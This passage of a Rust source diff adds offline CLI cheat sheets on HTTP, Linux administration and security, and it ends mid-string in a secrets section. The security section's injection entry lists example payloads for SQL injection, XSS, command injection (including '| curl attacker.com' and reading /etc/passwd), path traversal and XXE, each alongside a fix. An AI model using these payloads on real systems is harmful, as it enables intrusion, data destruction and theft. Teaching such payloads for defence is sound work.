@@ -35533,3 +35533,595 @@ pub fn jinja_calc(query: &str) -> String {
     }
     out
 }
+
+// ─── Wave 21: http-adv, linux-adv, security-ref, cloud-ref ───────────────────
+
+pub fn http_adv_calc(query: &str) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::new();
+    let sep = "─".repeat(60);
+
+    fn s_status() -> &'static str {
+        "  1xx Informational:\n  100 Continue             Client should continue sending request body\n  101 Switching Protocols  Upgrade accepted (WebSocket handshake)\n  103 Early Hints          Preload resources before final response\n\n  2xx Success:\n  200 OK                   Standard success\n  201 Created              Resource created (POST/PUT); include Location header\n  202 Accepted             Request queued; processing async\n  204 No Content           Success, no body (DELETE, PUT with no response)\n  206 Partial Content      Range request fulfilled; Content-Range header present\n\n  3xx Redirection:\n  301 Moved Permanently    Permanent redirect; change bookmarks; GET converted\n  302 Found                Temporary redirect; do not change bookmarks\n  303 See Other            After POST; redirect to GET resource\n  304 Not Modified         Conditional GET; use cached version\n  307 Temporary Redirect   Temporary; method preserved (no GET conversion)\n  308 Permanent Redirect   Permanent; method preserved\n\n  4xx Client Errors:\n  400 Bad Request          Malformed syntax / invalid input\n  401 Unauthorized         Authentication required; WWW-Authenticate header\n  403 Forbidden            Authenticated but not authorized\n  404 Not Found            Resource does not exist\n  405 Method Not Allowed   Wrong HTTP verb; Allow header lists valid methods\n  408 Request Timeout      Client too slow\n  409 Conflict             State conflict (optimistic lock, duplicate resource)\n  410 Gone                 Permanently deleted; stronger signal than 404\n  413 Content Too Large    Request body exceeds limit\n  415 Unsupported Media    Content-Type not accepted\n  422 Unprocessable        Semantic validation failed (well-formed but invalid)\n  429 Too Many Requests    Rate limited; Retry-After header\n\n  5xx Server Errors:\n  500 Internal Server Error Unhandled exception; never leak stack traces\n  501 Not Implemented       Verb not supported\n  502 Bad Gateway           Upstream returned invalid response\n  503 Service Unavailable   Overloaded or down; Retry-After header\n  504 Gateway Timeout       Upstream timed out\n"
+    }
+    fn s_caching() -> &'static str {
+        "  Cache-Control directives:\n  Response (server → client):\n  Cache-Control: max-age=3600         Cache for 1 hour\n  Cache-Control: no-store             Never cache (sensitive data)\n  Cache-Control: no-cache             Cache but revalidate before use\n  Cache-Control: private              Browser only; no shared caches\n  Cache-Control: public               CDN and browser may cache\n  Cache-Control: immutable            Never revalidate (versioned assets)\n  Cache-Control: s-maxage=86400       CDN TTL (overrides max-age for shared)\n  Cache-Control: stale-while-revalidate=60  Serve stale while refreshing\n  Cache-Control: stale-if-error=3600  Serve stale if origin is down\n  Cache-Control: must-revalidate      Don't serve stale even if origin down\n\n  Request (client → server):\n  Cache-Control: no-cache             Force revalidation\n  Cache-Control: no-store             Don't store response\n  Cache-Control: max-stale=60         Accept responses up to 60s stale\n  Cache-Control: min-fresh=120        Only if still fresh for 120s\n\n  ETag / conditional requests:\n  ETag: \"abc123\"                      Server assigns opaque version token\n  If-None-Match: \"abc123\"            Client revalidates; 304 if unchanged\n  Last-Modified: Wed, 21 Oct 2024     Date-based version\n  If-Modified-Since: Wed, 21 Oct 2024\n  Vary: Accept-Encoding               CDN caches separate copy per encoding\n  Vary: Accept-Language               Separate copy per language\n\n  Practical recipes:\n  Static immutable assets:  Cache-Control: public, max-age=31536000, immutable\n  API responses:            Cache-Control: private, no-cache\n  Sensitive pages:          Cache-Control: no-store\n  CDN cached API:           Cache-Control: public, s-maxage=60, max-age=0\n"
+    }
+    fn s_cors() -> &'static str {
+        "  CORS flow:\n  Simple request (GET/POST with safe headers): browser sends Origin header\n  Server responds with: Access-Control-Allow-Origin: https://example.com\n  No preflight for simple requests.\n\n  Preflight (OPTIONS) — triggered by:\n  - Methods other than GET/POST/HEAD\n  - Non-simple headers (Authorization, Content-Type: application/json, etc.)\n  - Custom headers\n\n  Preflight request headers:\n  OPTIONS /api/data HTTP/1.1\n  Origin: https://example.com\n  Access-Control-Request-Method: DELETE\n  Access-Control-Request-Headers: Authorization, Content-Type\n\n  Preflight response headers:\n  Access-Control-Allow-Origin: https://example.com\n  Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS\n  Access-Control-Allow-Headers: Authorization, Content-Type\n  Access-Control-Max-Age: 86400         (cache preflight result for 24h)\n  Access-Control-Allow-Credentials: true  (required to send cookies/auth)\n\n  Actual request response:\n  Access-Control-Allow-Origin: https://example.com\n  Access-Control-Expose-Headers: X-Request-ID, X-Rate-Limit\n\n  Wildcard rules:\n  Access-Control-Allow-Origin: *         (any origin; can't use with credentials)\n  If credentials=true: must use exact origin, not *\n\n  Common mistakes:\n  - Returning * with credentials=true → browser rejects\n  - Not handling OPTIONS in your router → 404/405 on preflight\n  - Forgetting to expose custom response headers via Expose-Headers\n  - CORS is enforced by the browser; server-to-server calls ignore it\n"
+    }
+    fn s_auth() -> &'static str {
+        "  Authentication schemes (WWW-Authenticate / Authorization headers):\n\n  Basic auth:\n  Authorization: Basic base64(username:password)\n  Only secure over HTTPS. Credentials in every request.\n\n  Bearer token (OAuth 2.0 / JWT):\n  Authorization: Bearer <token>\n  Standard for APIs. Token validated by server.\n\n  Digest auth:\n  Challenge-response; MD5 hash; mostly legacy.\n\n  API Key patterns:\n  Authorization: ApiKey <key>            (header)\n  X-API-Key: <key>                       (custom header)\n  ?api_key=<key>                         (query string — avoid; logged)\n\n  OAuth 2.0 flows:\n  Authorization Code     Web apps with redirect (most common)\n  PKCE                   Same but for SPAs/mobile (no client secret)\n  Client Credentials     Service-to-service (no user)\n  Device Code            CLI tools / TV apps (user codes)\n  Implicit               Deprecated; use PKCE instead\n\n  JWT structure: header.payload.signature (base64url encoded)\n  Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }\n  Payload: { \"sub\": \"user123\", \"iat\": 1700000000, \"exp\": 1700003600 }\n  Common claims: iss (issuer), sub (subject), aud (audience),\n                 exp (expiry), iat (issued at), jti (JWT ID)\n\n  Cookie auth:\n  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/\n  HttpOnly: prevents JS access (XSS protection)\n  Secure: HTTPS only\n  SameSite=Strict: no cross-site sending\n  SameSite=Lax: sent on top-level navigations only\n  SameSite=None: cross-site (requires Secure)\n"
+    }
+    fn s_headers() -> &'static str {
+        "  Security headers:\n  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload\n  Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com\n  X-Content-Type-Options: nosniff\n  X-Frame-Options: DENY\n  Referrer-Policy: strict-origin-when-cross-origin\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n  Cross-Origin-Resource-Policy: same-site\n\n  Request metadata:\n  Content-Type: application/json; charset=utf-8\n  Content-Type: multipart/form-data; boundary=----FormBoundaryXYZ\n  Accept: application/json, text/html;q=0.9, */*;q=0.8\n  Accept-Encoding: gzip, br, zstd\n  Accept-Language: en-US,en;q=0.9\n  User-Agent: Mozilla/5.0 ...\n  Referer: https://example.com/page\n  Origin: https://example.com\n  Host: api.example.com\n  X-Forwarded-For: 1.2.3.4, 5.6.7.8   (client IP through proxies)\n  X-Real-IP: 1.2.3.4\n  X-Request-ID: uuid4                  (trace across services)\n  Idempotency-Key: uuid4               (safe retry for POST)\n\n  Rate limiting:\n  RateLimit-Limit: 100\n  RateLimit-Remaining: 42\n  RateLimit-Reset: 1700003600          (Unix timestamp)\n  Retry-After: 30                      (seconds or HTTP date)\n\n  Content negotiation:\n  Accept: application/json             (client preference)\n  Content-Type: application/json       (actual body type)\n  406 Not Acceptable                   If server can't satisfy Accept\n"
+    }
+    fn s_performance() -> &'static str {
+        "  HTTP/2 and HTTP/3 key features:\n  HTTP/2:\n  - Multiplexing: multiple requests over one TCP connection\n  - Header compression: HPACK reduces overhead\n  - Server push: send resources before client asks\n  - Binary framing (not text like HTTP/1.1)\n  - Requires TLS in practice (h2 ALPN negotiation)\n\n  HTTP/3:\n  - QUIC transport (UDP-based; built-in TLS 1.3)\n  - No head-of-line blocking at transport layer\n  - Faster connection establishment (0-RTT reconnects)\n  - Connection migration (IP change survives)\n\n  Keep-Alive / connection reuse:\n  Connection: keep-alive               (HTTP/1.1 default)\n  Keep-Alive: timeout=5, max=100\n  Connection: close                    (force close after response)\n\n  Compression:\n  Accept-Encoding: gzip, br, zstd\n  Content-Encoding: gzip               (server response compressed)\n  Transfer-Encoding: chunked           (stream body in chunks)\n\n  Chunked transfer:\n  Transfer-Encoding: chunked\n  Each chunk: hex-size CRLF data CRLF\n  Terminal chunk: 0 CRLF CRLF\n\n  Server-Sent Events (SSE):\n  Content-Type: text/event-stream\n  Cache-Control: no-cache\n  Connection: keep-alive\n  data: {\"event\": \"update\", \"value\": 42}\\n\\n\n\n  WebSocket upgrade:\n  GET /ws HTTP/1.1\n  Upgrade: websocket\n  Connection: Upgrade\n  Sec-WebSocket-Key: base64-random-16-bytes\n  Sec-WebSocket-Version: 13\n  Response: 101 Switching Protocols\n  Upgrade: websocket\n  Sec-WebSocket-Accept: sha1(key + GUID) base64\n"
+    }
+
+    type HttpAdvSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+    const SECTIONS: &[HttpAdvSection] = &[
+        (
+            "status",
+            &[
+                "status", "code", "codes", "1xx", "2xx", "3xx", "4xx", "5xx", "redirect",
+            ],
+            s_status,
+        ),
+        (
+            "caching",
+            &[
+                "cache",
+                "caching",
+                "etag",
+                "max-age",
+                "vary",
+                "stale",
+                "immutable",
+            ],
+            s_caching,
+        ),
+        (
+            "cors",
+            &["cors", "preflight", "origin", "credentials", "expose"],
+            s_cors,
+        ),
+        (
+            "auth",
+            &[
+                "auth", "bearer", "jwt", "oauth", "cookie", "basic", "api-key",
+            ],
+            s_auth,
+        ),
+        (
+            "headers",
+            &[
+                "header",
+                "headers",
+                "csp",
+                "hsts",
+                "cto",
+                "security",
+                "rate-limit",
+            ],
+            s_headers,
+        ),
+        (
+            "performance",
+            &[
+                "performance",
+                "http2",
+                "http3",
+                "quic",
+                "sse",
+                "websocket",
+                "chunked",
+            ],
+            s_performance,
+        ),
+    ];
+
+    let q = query.trim().to_lowercase();
+
+    if q.is_empty() || q == "help" || q == "list" {
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  hematite --http-adv <TOPIC>");
+        let _ = writeln!(out, "  Offline advanced HTTP reference");
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  Topics:");
+        for &(name, aliases, _) in SECTIONS {
+            let _ = writeln!(out, "    {name:<12} ({})", aliases.join(", "));
+        }
+        let _ = writeln!(out, "\n  hematite --http-adv all   -- print everything");
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    if q == "all" {
+        let _ = writeln!(out, "{sep}");
+        for &(name, _, f) in SECTIONS {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+            let _ = writeln!(out, "");
+        }
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    let found: Vec<_> = SECTIONS
+        .iter()
+        .filter(|&&(name, aliases, _)| {
+            name.contains(q.as_str())
+                || aliases
+                    .iter()
+                    .any(|&a| a.contains(q.as_str()) || q.contains(a))
+        })
+        .collect();
+
+    if found.is_empty() {
+        let _ = writeln!(out, "  No topic found for '{}'.", query.trim());
+        let _ = writeln!(out, "  Run: hematite --http-adv help");
+    } else {
+        let _ = writeln!(out, "{sep}");
+        for &&(name, _, f) in &found {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+        }
+        let _ = writeln!(out, "{sep}");
+    }
+    out
+}
+
+pub fn linux_adv_calc(query: &str) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::new();
+    let sep = "─".repeat(60);
+
+    fn s_processes() -> &'static str {
+        "  Signals:\n  kill -l                      List all signals\n  kill -SIGTERM pid            Graceful shutdown (15)\n  kill -SIGKILL pid            Immediate kill, unblockable (9)\n  kill -SIGHUP pid             Reload config (1)\n  kill -SIGSTOP / SIGCONT pid  Pause / resume\n  kill -SIGUSR1 / SIGUSR2 pid  User-defined\n  killall -HUP nginx\n  pkill -f 'python.*worker'    Match full command line\n\n  Process tree:\n  pstree -p                    Show PIDs\n  pstree -u                    Show users\n  ps axjf                      Forest view\n  ps aux --sort=-%cpu          Sort by CPU\n  ps aux --sort=-%mem          Sort by memory\n  ps -p pid -o pid,ppid,cmd,%cpu,%mem\n\n  Proc filesystem:\n  /proc/PID/cmdline            Full command line (\\0-separated)\n  /proc/PID/status             State, memory, threads\n  /proc/PID/fd/                Open file descriptors (symlinks)\n  /proc/PID/maps               Memory map\n  /proc/PID/net/tcp            TCP connections\n  /proc/PID/environ            Environment variables\n  /proc/PID/exe                Symlink to executable\n  cat /proc/PID/cmdline | tr '\\0' ' '\n  ls -la /proc/PID/fd          Count open FDs\n\n  /proc system-wide:\n  /proc/cpuinfo                CPU details\n  /proc/meminfo                Memory stats\n  /proc/loadavg                1/5/15 min load\n  /proc/net/dev                Network interface stats\n  /proc/sys/                   Kernel parameters (sysctl)\n  /proc/interrupts             IRQ counts\n  /proc/version                Kernel version string\n"
+    }
+    fn s_tracing() -> &'static str {
+        "  strace — system call tracer:\n  strace ls\n  strace -p pid                Attach to running process\n  strace -p pid -e trace=read,write  Filter by syscall\n  strace -p pid -e trace=network\n  strace -p pid -e trace=file\n  strace -c cmd                Count syscalls + timing summary\n  strace -T cmd                Show time spent per syscall\n  strace -f cmd                Follow child processes (forks)\n  strace -o trace.log cmd      Write to file\n  strace -s 256 cmd            Increase string length (default 32)\n  strace -e openat,read,write ls\n\n  lsof — list open files:\n  lsof                         All open files (slow; pipe to grep)\n  lsof -p pid                  Files by PID\n  lsof -u username             Files by user\n  lsof /path/to/file           What has this file open\n  lsof +D /directory           Everything under directory\n  lsof -i                      All network connections\n  lsof -i :8080                What's on port 8080\n  lsof -i TCP:1-1024           TCP ports 1-1024\n  lsof -i @1.2.3.4             Connections to IP\n  lsof -nP -i TCP -s TCP:LISTEN  Listening ports (no DNS/port lookup)\n\n  perf — Linux performance counters:\n  perf stat cmd                CPU counters (instructions, cache misses)\n  perf record -g cmd           Record call graph\n  perf report                  Analyze recorded data\n  perf top                     Live top-like profiler\n  perf trace cmd               Lightweight strace alternative\n\n  ltrace — library call tracer:\n  ltrace cmd                   Trace shared library calls\n  ltrace -p pid\n"
+    }
+    fn s_namespaces() -> &'static str {
+        "  Linux namespaces (container primitives):\n  pid    Process IDs (container gets its own PID 1)\n  net    Network interfaces, routes, firewall rules\n  mnt    Filesystem mount points\n  uts    Hostname and domain name\n  ipc    System V IPC, POSIX message queues\n  user   UID/GID mappings (rootless containers)\n  cgroup cgroup root (Linux 4.6+)\n\n  Inspect namespaces:\n  lsns                         List all namespaces\n  ls -la /proc/PID/ns/         Namespace inodes for a process\n  nsenter -t pid --net ip addr  Enter a process's network namespace\n  nsenter -t pid --pid --mount --net bash  Enter multiple namespaces\n  unshare --net --pid --fork bash  Create new namespaces\n\n  cgroups v2:\n  /sys/fs/cgroup/               cgroup root (v2 unified hierarchy)\n  cat /sys/fs/cgroup/memory.current    Process group memory usage\n  echo pid > /sys/fs/cgroup/mygroup/cgroup.procs  Add process to group\n  cat /sys/fs/cgroup/cpu.stat\n  systemd-cgtop                 Top-like view of cgroup resource use\n  systemd-cgls                  Tree of cgroups\n\n  Container internals (what Docker actually does):\n  1. Create namespaces (unshare)\n  2. Set up cgroups for resource limits\n  3. Pivot root (chroot replacement) to container filesystem\n  4. Drop capabilities (CAP_NET_ADMIN etc.)\n  5. Apply seccomp profile (block dangerous syscalls)\n\n  Capabilities:\n  capsh --print                Current capabilities\n  getcap /path/to/binary\n  setcap cap_net_bind_service+ep /usr/bin/node\n  capsh --decode=0x3fffffffff  Decode hex capability mask\n"
+    }
+    fn s_sysctl() -> &'static str {
+        "  sysctl — read/write kernel parameters:\n  sysctl -a                    All parameters\n  sysctl net.ipv4.ip_forward\n  sysctl -w net.ipv4.ip_forward=1   (temporary; lost on reboot)\n  Persist: /etc/sysctl.conf or /etc/sysctl.d/99-custom.conf\n  sysctl -p                    Reload from /etc/sysctl.conf\n\n  Networking:\n  net.ipv4.ip_forward=1                Enable IP forwarding (router/VPN)\n  net.ipv4.tcp_syncookies=1            SYN flood protection\n  net.core.somaxconn=65535             Listen backlog (default 128)\n  net.ipv4.tcp_max_syn_backlog=8192\n  net.core.netdev_max_backlog=5000\n  net.ipv4.tcp_fin_timeout=15          Close TIME_WAIT faster\n  net.ipv4.tcp_tw_reuse=1              Reuse TIME_WAIT sockets\n  net.ipv4.ip_local_port_range=1024 65535\n\n  Memory:\n  vm.swappiness=10                     Prefer RAM over swap (0-100)\n  vm.dirty_ratio=15                    % RAM before sync write\n  vm.dirty_background_ratio=5\n  vm.overcommit_memory=1               Allow overcommit (containers)\n  vm.max_map_count=262144              Elasticsearch requirement\n  vm.nr_hugepages=1024                 HugePages for databases\n\n  File descriptors:\n  fs.file-max=2097152                  System-wide FD limit\n  fs.nr_open=1048576                   Per-process FD limit\n  # Per-process ulimit: /etc/security/limits.conf\n  # myuser hard nofile 65535\n  # * soft nofile 65535\n\n  Security:\n  kernel.dmesg_restrict=1              Non-root can't read dmesg\n  kernel.kptr_restrict=2               Hide kernel pointers\n  net.ipv4.conf.all.rp_filter=1        Reverse path filter (anti-spoofing)\n  net.ipv4.conf.all.accept_redirects=0 Ignore ICMP redirects\n"
+    }
+    fn s_filesystem() -> &'static str {
+        "  inodes and links:\n  stat file                    inode, links, permissions, timestamps\n  ls -i file                   Show inode number\n  df -i                        inode usage per filesystem\n  ln src dst                   Hard link (same inode)\n  ln -s target linkname        Symbolic link\n  readlink -f link             Resolve symlink chain\n  find . -inum 12345           Find files with inode\n  find . -links +1 -type f     Files with multiple hard links\n\n  Mount:\n  mount                        All mounted filesystems\n  mount | column -t\n  findmnt                      Tree view of mounts\n  findmnt /path\n  mount -t tmpfs tmpfs /mnt/tmp -o size=512m\n  mount --bind /src /dst       Bind mount (expose directory elsewhere)\n  mount -o remount,ro /        Remount read-only\n  umount /path\n  umount -l /path              Lazy unmount (when busy)\n\n  /proc/mounts vs /etc/fstab:\n  /proc/mounts                 Currently active mounts (kernel view)\n  /etc/fstab                   Persistent mount config\n\n  Disk and filesystem:\n  lsblk -f                     Block devices with filesystem type\n  blkid                        UUIDs and filesystem types\n  fdisk -l                     Partition table\n  parted -l\n  dumpe2fs /dev/sda1           ext4 superblock info\n  tune2fs -l /dev/sda1         ext4 parameters\n  xfs_info /mount              XFS info\n  e2fsck -f /dev/sda1          Check ext4 (unmounted)\n  fsck.ext4 -n /dev/sda1       Dry-run check\n\n  inotify (watch filesystem events):\n  inotifywait -m /path         Monitor path; print events\n  inotifywait -m -e modify,create,delete /path\n  inotifywatch -v /path        Count events over time\n"
+    }
+    fn s_networking() -> &'static str {
+        "  ip command (replaces ifconfig/route/netstat):\n  ip addr                      All interfaces and IPs\n  ip addr show eth0\n  ip link                      Layer 2 state\n  ip link set eth0 up/down\n  ip route                     Routing table\n  ip route get 8.8.8.8         Which route used to reach IP\n  ip route add 10.0.0.0/8 via 192.168.1.1 dev eth0\n  ip route del 10.0.0.0/8\n  ip neigh                     ARP table\n  ip neigh show dev eth0\n  ip -s link                   Interface statistics\n  ip netns list                Network namespaces\n  ip netns exec mynamespace ip addr\n\n  ss — socket statistics (replaces netstat):\n  ss -tlnp                     TCP listening with process names\n  ss -ulnp                     UDP listening\n  ss -s                        Summary\n  ss -tnp state established    Established TCP\n  ss -t dst 1.2.3.4            Connections to IP\n  ss -t '( dport = :443 )'     Filter by port\n\n  tc — traffic control (bandwidth shaping):\n  tc qdisc show                Current queuing disciplines\n  tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms\n  tc qdisc del dev eth0 root\n  # Simulate network conditions for testing:\n  tc qdisc add dev eth0 root netem delay 100ms 20ms\n  tc qdisc add dev eth0 root netem loss 1%\n  tc qdisc add dev eth0 root netem delay 50ms loss 0.5% corrupt 0.1%\n\n  nftables (modern iptables replacement):\n  nft list ruleset\n  nft list table inet filter\n  iptables -L -n -v            Legacy; still common\n  iptables-save > rules.v4     Backup\n  iptables-restore < rules.v4  Restore\n"
+    }
+
+    type LinuxAdvSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+    const SECTIONS: &[LinuxAdvSection] = &[
+        (
+            "processes",
+            &[
+                "process",
+                "processes",
+                "signal",
+                "proc",
+                "pstree",
+                "kill",
+                "pkill",
+            ],
+            s_processes,
+        ),
+        (
+            "tracing",
+            &[
+                "trace", "strace", "lsof", "perf", "ltrace", "syscall", "profil",
+            ],
+            s_tracing,
+        ),
+        (
+            "namespaces",
+            &[
+                "namespace",
+                "namespaces",
+                "cgroup",
+                "container",
+                "capability",
+                "seccomp",
+            ],
+            s_namespaces,
+        ),
+        (
+            "sysctl",
+            &[
+                "sysctl",
+                "kernel",
+                "param",
+                "swappiness",
+                "ip_forward",
+                "fd-limit",
+            ],
+            s_sysctl,
+        ),
+        (
+            "filesystem",
+            &[
+                "filesystem",
+                "inode",
+                "mount",
+                "bind",
+                "lsblk",
+                "inotify",
+                "fsck",
+            ],
+            s_filesystem,
+        ),
+        (
+            "networking",
+            &[
+                "networking",
+                "ip-cmd",
+                "ss-cmd",
+                "tc",
+                "nftables",
+                "iptables",
+                "socket",
+            ],
+            s_networking,
+        ),
+    ];
+
+    let q = query.trim().to_lowercase();
+
+    if q.is_empty() || q == "help" || q == "list" {
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  hematite --linux-adv <TOPIC>");
+        let _ = writeln!(out, "  Offline advanced Linux power-user reference");
+        let _ = writeln!(out, "{sep}");
+        let _ = writeln!(out, "  Topics:");
+        for &(name, aliases, _) in SECTIONS {
+            let _ = writeln!(out, "    {name:<12} ({})", aliases.join(", "));
+        }
+        let _ = writeln!(out, "\n  hematite --linux-adv all   -- print everything");
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    if q == "all" {
+        let _ = writeln!(out, "{sep}");
+        for &(name, _, f) in SECTIONS {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+            let _ = writeln!(out, "");
+        }
+        let _ = writeln!(out, "{sep}");
+        return out;
+    }
+
+    let found: Vec<_> = SECTIONS
+        .iter()
+        .filter(|&&(name, aliases, _)| {
+            name.contains(q.as_str())
+                || aliases
+                    .iter()
+                    .any(|&a| a.contains(q.as_str()) || q.contains(a))
+        })
+        .collect();
+
+    if found.is_empty() {
+        let _ = writeln!(out, "  No topic found for '{}'.", query.trim());
+        let _ = writeln!(out, "  Run: hematite --linux-adv help");
+    } else {
+        let _ = writeln!(out, "{sep}");
+        for &&(name, _, f) in &found {
+            let _ = writeln!(
+                out,
+                "  -- {name} {}",
+                "-".repeat(50usize.saturating_sub(name.len() + 4))
+            );
+            let _ = write!(out, "{}", f());
+        }
+        let _ = writeln!(out, "{sep}");
+    }
+    out
+}
+
+pub fn security_ref_calc(query: &str) -> String {
+    use std::fmt::Write as _;
+    let mut out = String::new();
+    let sep = "─".repeat(60);
+
+    fn s_owasp() -> &'static str {
+        "  OWASP Top 10 (2021) — quick reference:\n\n  A01 Broken Access Control\n    Vertical: lower-privilege user accesses admin function\n    Horizontal: user accesses another user's data\n    Fix: deny by default; check every request server-side; avoid IDOR\n\n  A02 Cryptographic Failures\n    Transmitting/storing sensitive data in plaintext or weak crypto\n    Fix: TLS everywhere; bcrypt/Argon2 for passwords; no MD5/SHA1 for secrets\n\n  A03 Injection (SQL, LDAP, OS, SSTI)\n    User input interpreted as code\n    Fix: parameterized queries; input validation; ORM; escape output\n\n  A04 Insecure Design\n    Missing threat modeling; flawed business logic\n    Fix: threat modeling; security design patterns; abuse case testing\n\n  A05 Security Misconfiguration\n    Default creds; verbose errors; open cloud buckets; debug mode in prod\n    Fix: harden defaults; disable unneeded features; scan config drift\n\n  A06 Vulnerable and Outdated Components\n    Running known-CVE libraries\n    Fix: SCA tools (Dependabot, Snyk, OSV); pin versions; audit regularly\n\n  A07 Identification and Authentication Failures\n    Weak passwords; no MFA; broken session management\n    Fix: MFA; secure session IDs; rate-limit login; rotate tokens\n\n  A08 Software and Data Integrity Failures\n    Unsigned updates; insecure deserialization; CI/CD pipeline compromise\n    Fix: verify signatures; use trusted registries; pin CI actions\n\n  A09 Security Logging and Monitoring Failures\n    No audit trail; undetected breaches\n    Fix: log auth events; alert on anomalies; test incident response\n\n  A10 Server-Side Request Forgery (SSRF)\n    Server fetches attacker-controlled URL (access internal metadata APIs)\n    Fix: allowlist outbound targets; block 169.254.169.254; don't follow redirects\n"
+    }
+    fn s_injection() -> &'static str {
+        "  SQL Injection:\n  Vulnerable:  \"SELECT * FROM users WHERE id = \" + userId\n  Safe:        \"SELECT * FROM users WHERE id = ?\" (parameterized)\n  Safe:        db.query('SELECT * FROM users WHERE id = $1', [userId])\n\n  Types:\n  Classic:  ' OR '1'='1            (always-true condition)\n  UNION:    ' UNION SELECT null,table_name FROM information_schema.tables--\n  Blind:    ' AND 1=1--  vs  ' AND 1=2--  (time or boolean inference)\n  Time:     ' OR SLEEP(5)--        (MySQL)  / pg_sleep(5) (Postgres)\n  Out-of-band: exfiltrate via DNS / HTTP from database server\n  Stacked:  '; DROP TABLE users--  (if driver allows multiple statements)\n\n  XSS (Cross-Site Scripting):\n  Reflected: attacker URL parameter reflected into page output\n  Stored:    malicious payload stored in DB, rendered to other users\n  DOM-based: client-side JS writes attacker data to DOM\n\n  Payloads: <script>alert(1)</script>  /  <img src=x onerror=alert(1)>\n  Fix: escape output for context (HTML entities, JS string escaping)\n  Fix: Content-Security-Policy; HTTPOnly cookies; innerText not innerHTML\n\n  SSTI (Server-Side Template Injection):\n  {{7*7}} => 49 in Jinja2/Twig; ${7*7} in FreeMarker\n  Fix: never pass raw user input to template engines\n\n  Command Injection:\n  Vulnerable: os.system('ping ' + userInput)\n  Payload:    ; cat /etc/passwd  /  && whoami  /  | curl attacker.com\n  Fix: use subprocess with args list; never shell=True with user input\n\n  Path Traversal:\n  Payload: ../../../../etc/passwd\n  Fix: realpath() + prefix check; canonicalize before file ops\n\n  XXE (XML External Entity):\n  <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n  Fix: disable external entities in XML parser; use JSON where possible\n"
+    }
+    fn s_tls() -> &'static str {
+        "  TLS configuration — recommended settings:\n\n  Protocol versions:\n  Minimum: TLS 1.2 (disable SSLv3, TLS 1.0, TLS 1.1)\n  Preferred: TLS 1.3 only where possible\n\n  Cipher suites (TLS 1.2 — prefer ECDHE + AES-GCM or CHACHA20):\n  ECDHE-ECDSA-AES128-GCM-SHA256\n  ECDHE-RSA-AES128-GCM-SHA256\n  ECDHE-ECDSA-AES256-GCM-SHA384\n  ECDHE-RSA-AES256-GCM-SHA384\n  ECDHE-ECDSA-CHACHA20-POLY1305\n  ECDHE-RSA-CHACHA20-POLY1305\n  Disable: RC4, 3DES, DES, NULL, EXPORT, CBC (for BEAST)\n\n  TLS 1.3 cipher suites (auto; can't configure):\n  TLS_AES_128_GCM_SHA256\n  TLS_AES_256_GCM_SHA384\n  TLS_CHACHA20_POLY1305_SHA256\n\n  Certificate validation:\n  Verify hostname matches CN/SAN\n  Check full chain to trusted root CA\n  Check OCSP / CRL for revocation\n  Certificate Transparency log check\n\n  nginx TLS hardening:\n  ssl_protocols TLSv1.2 TLSv1.3;\n  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...;\n  ssl_prefer_server_ciphers off;\n  ssl_session_cache shared:SSL:10m;\n  ssl_session_timeout 1d;\n  ssl_session_tickets off;    (forward secrecy: don't reuse session keys)\n  ssl_stapling on;\n  ssl_stapling_verify on;\n  add_header Strict-Transport-Security \"max-age=63072000\" always;\n\n  openssl diagnostics:\n  openssl s_client -connect host:443 -servername host\n  openssl s_client -connect host:443 </dev/null 2>&1 | grep -E 'Protocol|Cipher'\n  openssl x509 -in cert.pem -noout -text\n  openssl x509 -in cert.pem -noout -dates\n  openssl verify -CAfile chain.pem cert.pem\n"
+    }
+    fn s_secrets() -> &'static str {
+        "  Secrets management patterns:\n\n  Never do:\n  - Commit secrets to git (even private repos; use git-secrets or pre-commit)\n  - Store secrets in environment variables in Dockerfiles (baked into layers)\n  - Log secrets (mask in log output)\n  - Use the same secret across environments\n  - Hardcode secrets in source code or config files\n\n  Environment variables (minimum viable):\n  .env file + .gitignore; loaded by dotenv at runtime\n  Never pass via --build-arg (visible in docker history)\n  Use Docker secrets / Kubernetes secrets for containers\n\n  Vault (HashiCorp):\n  vault kv put secret/myapp db_password=supersecret\n  vault kv get secret/myapp\n  vault kv get -field=db_password secret/myapp\n  App reads via Vault agent sidecar or SDK at runtime\n\n  Cloud secret stores:\n  AWS:    aws secretsmanager get-secret-value --secret-id MySecret\n  AWS:    aws ssm get-parameter --name /myapp/db-pass --with-decryption\n  GCP:    gcloud secrets versions access latest --secret=MY_SECRET\n  Azure:  az keyvault secret show --vault-name MyVault --name MySecret\n\n  Kubernetes secrets:\n  kubectl create secret generic mysecret --from-literal=password=abc123\n  # Mount as volume (not env var — env vars can leak to child processes)\n  volumes:\n    - name: secret-vol\n      secret: { secretName: mysecret }\n  volumeMounts:\n    - name: secret-vol\n      mountPath: /run/secrets\n      readOnly: true\n\n  Rotation:\n  - Rotate secrets regularly and on suspected compromise\n  - Use short-lived tokens (IAM roles, OIDC, Workload Identity)\n  - Audit access: who fetched which 